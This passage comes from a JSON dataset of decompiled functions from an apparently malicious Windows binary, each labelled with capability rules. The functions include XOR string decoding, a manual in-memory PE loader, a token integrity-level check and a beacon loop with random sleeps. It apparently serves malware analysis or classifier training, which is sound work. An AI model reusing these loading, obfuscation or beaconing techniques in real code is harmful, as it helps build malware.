(puVar7 != 0x1) break;\n            fcn.0040509e();\n            uVar4 = (*pcVar5)(0, lpLibFileName);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n            uVar4 = 0;\n        }\n        var_78h = 0x7739494a;\n        var_74h = 0x78196f28;\n        var_70h = 0x492e7833;\n        var_6ch = 0x6f39772c;\n        var_68h = 0x782b786c;\n        var_64h = 0x77114922;\n        var_60h = 0x783b6f1b;\n        var_5ch = 0x491c7818;\n        var_58h = 0x6f1e7717;\n        var_54h = 0x782b783d;\n        var_50h = 0x77164926;\n        var_4ch = 0x782c6f0c;\n        var_48h = 0x49017805;\n        _var_44h = 0x6f0c771d;\n        stack0xffffffbc = 0x78327869;\n        stack0xffffffc0 = 0x77084917;\n        var_3bh._3_1_ = 0x14;\n        var_37h._0_2_ = 0x266f;\n        var_37h._2_1_ = 0x78;\n        stack0xffffffc8 = 0x490a7805;\n        _var_30h = 0x6f24770a;\n        var_2fh._3_1_ = 0x49;\n        var_2bh = 0x78;\n        var_8h = 0x7778496f;\n        var_4h._0_1_ = 0x78;\n        uVar4 = (*pcVar5)(8, 0x9d);\n        pcVar5 = _sym.imp.KERNEL32.dll_HeapAlloc;\n        var_7ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        do {\n            puVar1 = iVar11 + var_7ch;\n            iVar9 = iVar11 % var_10h;\n            iVar11 = iVar11 + 1;\n            *puVar1 = *(&var_8h + iVar9) ^ puVar1[&var_78h - var_7ch];\n        } while (iVar11 < 0x4e);\n        var_54h = 0x65034310;\n        var_50h = 0x5030352b;\n        var_4ch = 0x43505211;\n        var_48h = 0x3500653d;\n        _var_44h = 0x520a502c;\n        stack0xffffffbc = 0x65754341;\n        stack0xffffffc0 = 0x5017350e;\n        var_3bh._3_1_ = 4;\n        var_37h._0_2_ = 0x4652;\n        var_37h._2_1_ = 0x43;\n        stack0xffffffc8 = 0x3521653b;\n        _var_30h = 0x5265501f;\n        var_8h = 0x65504335;\n        var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x52);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n        puVar7 = (*pcVar5)(uVar4);\n        iVar11 = 0;\n        do {\n            puVar1 = puVar7 + iVar11;\n            iVar9 = iVar11 % var_10h;\n            iVar11 = iVar11 + 1;\n            *puVar1 = *(&var_8h + iVar9) ^ puVar1[&var_54h - puVar7];\n            pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        } while (iVar11 < 0x28);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n        puVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        var_10h = puVar8;\n        uVar4 = (*pcVar5)(8, 0x208);\n        var_14h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        for (iVar11 = 0x208; iVar11 != 0; iVar11 = iVar11 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        puVar8 = var_14h;\n        for (iVar11 = 0x208; pcVar2 = _sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW,  iVar11 != 0;\n            iVar11 = iVar11 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(var_7ch, var_10h, 0x104);\n        (*pcVar2)(puVar7, var_14h, 0x104);\n        iVar11 = fcn.0040bd9c();\n        if (iVar11 != 0) break;\n        iVar11 = fcn.00409781();\n        if (iVar11 == 0) break;\n        fcn.0040e896();\n        uVar4 = 0;\n    }\n    fcn.004017a5();\n    uVar4 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040c142, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar4);\n    uVar4 = (*pcVar5)(0, var_10h);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*pcVar5)(0, var_14h);\n    (*pcVar2)(uVar4);\n    do {\n        (*_sym.imp.KERNEL32.dll_Sleep)(0xffffffff);\n    } while( true );\n}\n",
        "token_count": 2859
    },
    "00402271": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402271(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    int32_t *piVar2;\n    int32_t *in_EDX;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    int32_t *piVar7;\n    code *pcVar8;\n    uint var_24h;\n    code *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t hObject;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    hObject = 0;\n    var_20h = fcn.00403578;\n    (*_sym.imp.KERNEL32.dll_GetVersion)();\n    piVar2 = in_EDX;\n    if (((arg_8h & 0x10) == 0) && ((*0x41cadc & 1) != 0)) {\n        var_20h = 0x412000;\n        piVar2 = in_EDX + 2;\n    }\n    iVar3 = *piVar2;\n    if (iVar3 == 0) {\n        iVar3 = 2;\n    }\n    else {\n        uVar5 = *(*(iVar3 + 0x3c) + 0x50 + iVar3) + 0xfffU & 0xfffff000;\n        iVar3 = fcn.004010fe(&hObject);\n        if (((iVar3 == 0) && (iVar3 = fcn.00401411(&var_4h),  iVar3 == 0)) &&\n           (iVar3 = fcn.004012b6(var_4h),  iVar3 == 0)) {\n            iVar1 = uVar5 + var_8h;\n            puVar4 = *in_EDX;\n            puVar6 = uVar5 + 0xc50 + var_8h;\n            for (iVar3 = in_EDX[4]; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            puVar4 = in_EDX[2];\n            puVar6 = in_EDX[4] + var_8h + 0xc50 + uVar5;\n            for (iVar3 = in_EDX[5]; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            *(iVar1 + 0x30) = var_4h;\n            *(iVar1 + 0x34) = var_4h >> 0x1f;\n            piVar2 = in_EDX;\n            piVar7 = iVar1 + 0x18;\n            for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *piVar7 = *piVar2;\n                piVar2 = piVar2 + 1;\n                piVar7 = piVar7 + 1;\n            }\n            iVar3 = var_4h + 0xc50 + uVar5;\n            *(iVar1 + 0x18) = iVar3;\n            *(iVar1 + 0x1c) = iVar3 >> 0x1f;\n            iVar3 = in_EDX[4] + 0xc50 + uVar5 + var_4h;\n            *(iVar1 + 0x20) = iVar3;\n            *(iVar1 + 0x24) = iVar3 >> 0x1f;\n            *(iVar1 + 0x28) = in_EDX[4];\n            *(iVar1 + 0x2c) = in_EDX[5];\n            if (((arg_8h & 0x10) == 0) && ((*0x41cadc & 1) != 0)) {\n                iVar3 = fcn.00401f77();\n            }\n            else {\n                iVar3 = fcn.00401c64();\n            }\n            if (iVar3 == 0) {\n                pcVar8 = iVar1 + 0x40;\n                for (iVar3 = 0x800; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *pcVar8 = *var_20h;\n                    var_20h = var_20h + 1;\n                    pcVar8 = pcVar8 + 1;\n                }\n                iVar3 = fcn.00402439(in_ECX, var_4h + uVar5 + 0x40, var_4h + uVar5, arg_8h);\n            }\n        }\n        if (var_8h != 0) {\n            fcn.0040168b();\n        }\n        if (hObject != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 1161
    },
    "004030a5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.004030a5(uint param_1, int32_t *param_2)\n\n{\n    uint8_t *puVar1;\n    bool bVar2;\n    char cVar3;\n    uint uVar4;\n    char *pcVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    char *pcVar9;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = -1;\n    var_8h = *0x41cd40;\n    var_44h = 0x32255224;\n    var_40h = 0x2e572310;\n    var_3ch = 0x5c2e1f3f;\n    var_38h = 0x351a382b;\n    var_34h = 0x1253441;\n    var_30h = 0x2e314630;\n    var_2ch = 0x6b1e3f0c;\n    var_28h = 0x3774409;\n    var_24h = 0x72436372;\n    var_20h = 0x75667f08;\n    var_14h = 0x56463045;\n    var_10h._0_1_ = 0x75;\n    var_1ch = param_2;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x29);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar8 = 0;\n    do {\n        var_4h = 5;\n        puVar1 = pcVar5 + iVar8;\n        iVar7 = iVar8 % 5;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_14h + iVar7) ^ puVar1[&var_44h - pcVar5];\n    } while (iVar8 < 0x28);\n    iVar8 = 0;\n    pcVar9 = str.QQIEQ4_;\n    do {\n        var_14h = 1;\n        var_4h = 0;\n        do {\n            if (pcVar9[iVar8] != '\\0') {\n                cVar3 = *pcVar5;\n                pcVar6 = pcVar5;\n                while (cVar3 != pcVar9[iVar8]) {\n                    if (cVar3 == '\\0') {\n                        bVar2 = false;\n                        goto code_r0x00403184;\n                    }\n                    pcVar6 = pcVar6 + 1;\n                    cVar3 = *pcVar6;\n                }\n            }\n            var_4h = var_4h + 1;\n        } while (var_4h < 0x20);\n        bVar2 = true;\ncode_r0x00403184:\n        if (((*pcVar9 != '\\0') && (pcVar9[0x1f] == '\\0')) && (bVar2)) {\n            iVar7 = fcn.0040bba8();\n            if (iVar7 != -1) {\n                *var_1ch = iVar7;\n                var_ch = iVar8;\n                break;\n            }\n            var_8h = var_8h * 0x19660d + 0x3c6ef35f;\n            (*_sym.imp.KERNEL32.dll_Sleep)(var_8h % 600000 + 60000);\n        }\n        pcVar9 = pcVar9 + 0x20;\n        iVar8 = iVar8 + 1;\n    } while (pcVar9 < 0x41ca50);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return var_ch;\n}\n",
        "token_count": 975
    },
    "004032d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004032d0(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t *in_ECX;\n    int32_t iVar2;\n    char *pcVar3;\n    uint uVar4;\n    char *pcVar5;\n    uint *puVar6;\n    char *pcVar7;\n    uint var_d4h;\n    char *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar6 = &var_8h;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    uVar4 = 0;\n    puVar6 = &var_d4h;\n    for (iVar2 = 200; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    if ((*in_ECX != 0) && (in_ECX[1] != 0)) {\n        iVar2 = fcn.00404ec1();\n        if (-1 < iVar2) {\n            var_ch = fcn.0040b18e(var_4h, var_8h);\n            if (var_ch != NULL) {\n                pcVar3 = str.QQIEQ4_;\n                pcVar5 = var_ch;\n                for (iVar2 = 0x184; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *pcVar5 = '\\0';\n                    pcVar5 = pcVar5 + 1;\n                }\n                pcVar5 = str.QQIEQ4_;\n                pcVar7 = var_ch;\n                for (iVar2 = 0x184; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *pcVar7 = *pcVar5;\n                    pcVar5 = pcVar5 + 1;\n                    pcVar7 = pcVar7 + 1;\n                }\n                pcVar5 = var_ch;\n                for (iVar2 = 0x140; pcVar1 = _sym.imp.KERNEL32.dll_lstrcpyA,  iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *pcVar5 = '\\0';\n                    pcVar5 = pcVar5 + 1;\n                }\n                (*_sym.imp.KERNEL32.dll_lstrcpyA)(var_ch, str.QQIEQ4_ + arg_8h * 0x20);\n                pcVar5 = var_ch;\n                do {\n                    pcVar5 = pcVar5 + 0x20;\n                    if (*pcVar3 != '\\0') {\n                        (*pcVar1)(pcVar5, pcVar3);\n                    }\n                    pcVar3 = pcVar3 + 0x20;\n                } while (pcVar3 < 0x41ca30);\n            }\n            fcn.0040b27a();\n            *0x41cb1c = var_8h;\n            uVar4 = 1;\n            *0x41cb20 = var_4h;\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 707
    },
    "004033a9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403471)\n\nuint __cdecl fcn.004033a9(uint arg_8h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint32_t uStack24;\n    uchar auStack16 [12];\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_OutputDebugStringA;\n    puVar4 = auStack16;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    puVar4 = 0x41cb1c;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    (*pcVar1)(\"WMA 0\");\n    iVar3 = fcn.0040b02f();\n    if (iVar3 != 0) {\n        (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41cae0);\n        (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    }\n    cVar2 = fcn.0040d356();\n    if ((cVar2 != '\\0') && (iVar3 = fcn.004032d0(0),  iVar3 != 0)) {\n        (*pcVar1)(\"WMA 1\");\n        fcn.0040b27a();\n        (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41cae0);\n    }\n    while (*0x41cb18 == 0) {\n        iVar3 = fcn.004030a5();\n        if (iVar3 != -1) {\n            fcn.0040ba74();\n        }\n        uStack24 = uStack24 * 0x19660d + 0x3c6ef35f;\n        (*_sym.imp.KERNEL32.dll_Sleep)(uStack24 % 600000 + 60000);\n    }\n    return 0;\n}\n",
        "token_count": 472
    },
    "00403578": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403578(code **arg_8h)\n\n{\n    code **ppcVar1;\n    uint32_t uVar2;\n    code cVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code **ppcVar8;\n    code *pcVar9;\n    uint32_t *puVar10;\n    uint32_t uVar11;\n    uint var_2ch;\n    uint var_28h;\n    code *var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    code *var_10h;\n    int32_t *var_ch;\n    code **var_8h;\n    uint32_t var_4h;\n    \n    ppcVar1 = arg_8h;\n    uVar11 = 0;\n    ppcVar8 = arg_8h[0xc];\n    if (ppcVar8 == NULL) {\n        ppcVar1 = arg_8h + 0xe;\n        pcVar9 = *arg_8h;\n        arg_8h = ppcVar8;\n        (*pcVar9)(0, 0, ppcVar1, &var_2ch);\n    }\n    else {\n        var_10h = ppcVar8[0xf] + ppcVar8;\n        var_24h = *(var_10h + 0x14);\n        var_1ch = *(var_10h + 6);\n        var_14h = 0;\n        arg_8h = ppcVar8;\n        if (*(var_10h + 0x80) != 0) {\n            var_ch = *(var_10h + 0x80) + ppcVar8;\n            iVar6 = var_ch[3];\n            if (iVar6 != 0) {\n                do {\n                    iVar7 = 0;\n                    cVar3 = *(iVar6 + arg_8h);\n                    if (cVar3 != 0x0) {\n                        ppcVar8 = ppcVar1 + 0x210;\n                        do {\n                            iVar7 = iVar7 + 1;\n                            *ppcVar8 = cVar3;\n                            ppcVar8 = ppcVar8 + 2;\n                            cVar3 = (iVar6 + arg_8h)[iVar7];\n                        } while (cVar3 != 0x0);\n                    }\n                    iVar4 = iVar7 * 2;\n                    *(ppcVar1 + 0xe) = iVar4;\n                    *(ppcVar1 + 0x3a) = iVar4 + 2;\n                    ppcVar1[0xf] = ppcVar1 + 0x210;\n                    iVar7 = (**ppcVar1)(0, 0, ppcVar1 + 0xe, &var_14h);\n                    if (iVar7 < 0) {\n                        iVar7 = -0x3ffffc91;\n                        break;\n                    }\n                    var_4h = 0;\n                    iVar6 = var_ch[4];\n                    iVar5 = *var_ch;\n                    if ((*var_ch != 0) || (iVar5 = iVar6,  iVar6 != 0)) {\n                        var_18h = iVar6 + arg_8h;\n                        for (var_8h = iVar5 + arg_8h; ppcVar8 = *var_8h,  ppcVar8 != NULL; var_8h = var_8h + 1) {\n                            if (ppcVar8 < 0x80000000) {\n                                ppcVar8 = ppcVar8 + arg_8h;\n                            }\n                            else if ((ppcVar8 < arg_8h) || (*(var_10h + 0x50) + arg_8h <= ppcVar8)) {\n                                var_4h = *var_8h;\n                                ppcVar8 = NULL;\n                            }\n                            if (ppcVar8 != NULL) {\n                                pcVar9 = ppcVar8 + 2;\n                                iVar6 = 0;\n                                cVar3 = *pcVar9;\n                                while (cVar3 != 0x0) {\n                                    iVar6 = iVar6 + 1;\n                                    cVar3 = pcVar9[iVar6];\n                                }\n                                *(ppcVar1 + 0xe) = iVar6;\n                                ppcVar1[0xf] = pcVar9;\n                                ppcVar8 = ppcVar1 + 0xe;\n                                *(ppcVar1 + 0x3a) = iVar6 + 1;\n                            }\n                            iVar7 = (*ppcVar1[2])(var_14h, ppcVar8, var_4h, &var_20h);\n                            if (iVar7 < 0) {\n                                iVar7 = -0x3fffff86;\n                                break;\n                            }\n                            *var_18h = var_20h;\n                            var_18h = var_18h + 1;\n                        }\n                    }\n                    iVar6 = var_ch[8];\n                    var_ch = var_ch + 5;\n                } while (iVar6 != 0);\n                if (iVar7 < 0) {\n                    return;\n                }\n            }\n        }\n        pcVar9 = var_10h;\n        var_ch = *(var_10h + 0x54);\n        iVar6 = (*ppcVar1[4])(0xffffffff, &arg_8h, &var_ch, 4, &var_28h);\n        if (var_1ch != 0) {\n            puVar10 = pcVar9 + var_24h + 0x3c;\n            do {\n                if (iVar6 < 0) {\n                    return;\n                }\n                uVar2 = *puVar10;\n                if ((uVar2 & 0x20000000) == 0) {\n                    if ((uVar2 & 0x40000000) == 0) {\n                        iVar6 = 4;\n                    }\n                    else {\n                        iVar6 = (uVar2 >> 0x1f & 2U) + 2;\n                    }\n                }\n                else {\n                    iVar6 = (uVar2 >> 0x1f & 0x20U) + 0x20;\n                }\n                var_ch = puVar10[-7];\n                var_24h = puVar10[-6] + arg_8h;\n                iVar6 = (*ppcVar1[4])(0xffffffff, &var_24h, &var_ch, iVar6, &var_28h);\n                puVar10 = puVar10 + 10;\n                uVar11 = uVar11 + 1;\n                pcVar9 = var_10h;\n            } while (uVar11 < var_1ch);\n        }\n        if (-1 < iVar6) {\n            (*(*(pcVar9 + 0x28) + arg_8h))(arg_8h, 1, ppcVar1 + 6);\n        }\n    }\n    return;\n}\n",
        "token_count": 1549
    },
    "00403b18": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00403b18(char *param_1, char *param_2)\n\n{\n    uint uVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char cVar4;\n    char *pcVar5;\n    uint uVar6;\n    uint var_4h;\n    \n    uVar6 = 0;\n    if (param_1 != NULL) {\n        if (param_2 == 0xffffffff) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(param_1);\n        }\n        pcVar2 = param_2;\n        if (1 < param_2) {\n            do {\n                pcVar2 = pcVar2 + -1;\n                if (pcVar2 < 0) goto code_r0x00403b5a;\n                pcVar3 = param_1 + pcVar2;\n            } while (*pcVar3 != '\\\\');\n            if (pcVar3 != NULL) {\n                param_2 = param_1 + (param_2 - (pcVar3 + 1));\n                param_1 = pcVar3 + 1;\n            }\n        }\ncode_r0x00403b5a:\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, param_2 + 1);\n        pcVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (pcVar2 != NULL) {\n            pcVar3 = pcVar2;\n            pcVar5 = param_2;\n            if ((*param_1 == '\\\"') && (param_1[param_2 + -1] == '\\\"')) {\n                param_2 = param_2 + -2;\n                param_1 = param_1 + 1;\n                pcVar5 = param_2;\n            }\n            for (; param_2 != NULL; param_2 = param_2 + -1) {\n                *pcVar3 = *param_1;\n                param_1 = param_1 + 1;\n                pcVar3 = pcVar3 + 1;\n            }\n            pcVar2[pcVar5] = '\\0';\n            cVar4 = *pcVar2;\n            pcVar3 = pcVar2;\n            while (cVar4 != '\\0') {\n                cVar4 = *pcVar3;\n                if (cVar4 + 0x9fU < 0x1a) {\n                    cVar4 = cVar4 + -0x20;\n                }\n                *pcVar3 = cVar4;\n                pcVar3 = pcVar3 + 1;\n                cVar4 = *pcVar3;\n            }\n            uVar6 = fcn.00408fe7();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 641
    },
    "00403c33": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nchar __fastcall fcn.00403c33(uint param_1)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    char cVar7;\n    code *pcVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint8_t *nSubAuthority;\n    uint var_20h;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint TokenHandle;\n    uint TokenInformationLength;\n    uint *TokenInformation;\n    uint var_1h;\n    \n    cVar7 = '\\0';\n    var_1h._0_1_ = '\\0';\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(param_1, 8, &TokenHandle);\n    if (iVar3 != 0) {\n        iVar3 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x19, 0, 0, &TokenInformationLength);\n        if ((iVar3 == 0) &&\n           (iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap, \n           iVar3 == 0x7a)) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, TokenInformationLength);\n            pcVar2 = _sym.imp.KERNEL32.dll_HeapAlloc;\n            TokenInformation = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            cVar7 = var_1h;\n            if (TokenInformation != NULL) {\n                var_48h = 0x23133a38;\n                var_44h = 0x2e080a77;\n                var_40h = 0x1d67220e;\n                var_3ch = 0x291f3a1c;\n                var_38h = 0x230c1140;\n                var_34h._0_1_ = 0x7a;\n                var_30h = 0x477a4f6d;\n                var_2ch._0_2_ = 0x7834;\n                uVar4 = (*pcVar8)(8, 0x16);\n                iVar3 = (*pcVar2)(uVar4);\n                puVar10 = TokenInformation;\n                iVar9 = 0;\n                var_18h = iVar3;\n                do {\n                    var_14h = 6;\n                    puVar1 = iVar9 + iVar3;\n                    iVar6 = iVar9 % 6;\n                    iVar9 = iVar9 + 1;\n                    *puVar1 = *(&var_30h + iVar6) ^ puVar1[&var_48h - iVar3];\n                } while (iVar9 < 0x15);\n                iVar9 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                                  (TokenHandle, 0x19, TokenInformation, TokenInformationLength, &TokenInformationLength)\n                ;\n                pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (iVar9 != 0) {\n                    var_48h = 0x30124f6a;\n                    var_44h = 0x14705426;\n                    var_40h = 0x5f4d202a;\n                    var_3ch = 0xa732a0e;\n                    var_38h = CONCAT22(var_38h._2_2_, 0x6100);\n                    nSubAuthority = 0x44613639;\n                    var_20h._0_1_ = 0x43;\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n                    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                    var_14h = 5;\n                    var_28h = iVar9;\n                    iVar3 = 0;\n                    do {\n                        puVar1 = iVar3 + iVar9;\n                        iVar6 = iVar3 % 5;\n                        iVar3 = iVar3 + 1;\n                        *puVar1 = *(&nSubAuthority + iVar6) ^ puVar1[&var_48h - iVar9];\n                    } while (iVar3 < 0x12);\n                    nSubAuthority = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthorityCount)(*TokenInformation);\n                    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    if ((nSubAuthority != NULL) && (*nSubAuthority != 0)) {\n                        var_44h = 0x19351115;\n                        var_40h = 0x2c152a2a;\n                        var_3ch = 0x1704202e;\n                        var_38h = 0x4777693a;\n                        var_30h = 0x5a596547;\n                        var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x45);\n                        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n                        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                        iVar9 = 0;\n                        do {\n                            puVar1 = iVar9 + iVar3;\n                            iVar6 = iVar9 % var_14h;\n                            iVar9 = iVar9 + 1;\n                            *puVar1 = *(&var_30h + iVar6) ^ puVar1[&var_44h - iVar3];\n                        } while (iVar9 < 0x10);\n                        puVar5 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthority)(*TokenInformation, *nSubAuthority - 1);\n                        iVar9 = var_28h;\n                        pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        if (puVar5 != NULL) {\n                            if (*puVar5 < 0x2000) {\n                                var_1h._0_1_ = '\\x01';\n                            }\n                            else {\n                                var_1h._0_1_ = '\\x03' - (*puVar5 < 0x3000);\n                            }\n                        }\n                        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    }\n                    iVar3 = var_18h;\n                    uVar4 = (*pcVar8)(0, iVar9);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    puVar10 = TokenInformation;\n                }\n                uVar4 = (*pcVar8)(0, puVar10);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                uVar4 = (*pcVar8)(0, iVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                cVar7 = var_1h;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n    }\n    return cVar7;\n}\n",
        "token_count": 1661
    },
    "00403e9e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
